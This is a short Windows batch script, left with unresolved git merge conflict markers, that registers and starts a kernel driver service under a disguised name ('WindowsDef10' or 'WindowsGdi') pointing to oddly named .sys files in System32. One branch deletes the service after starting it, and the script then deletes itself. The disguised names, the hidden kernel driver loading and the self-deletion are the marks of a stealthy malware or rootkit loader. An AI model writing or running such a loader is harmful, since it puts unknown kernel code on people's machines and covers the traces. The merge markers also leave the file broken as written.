@echo off
cd %~dp0
<<<<<<< HEAD
sc create WindowsDef10 binpath=C:\Windows\System32\iaLPSS9i_GPIO_CNL.sys type=kernel
sc start WindowsDef10
=======
sc create WindowsGdi binpath=C:\Windows\System32\dsc\DseCoreR.sys type=kernel
sc start WindowsGdi
sc delete WindowsGdi
>>>>>>> 128d7bfba93bc973e2b72e29e1e7cd84d3846439
del "%~f0"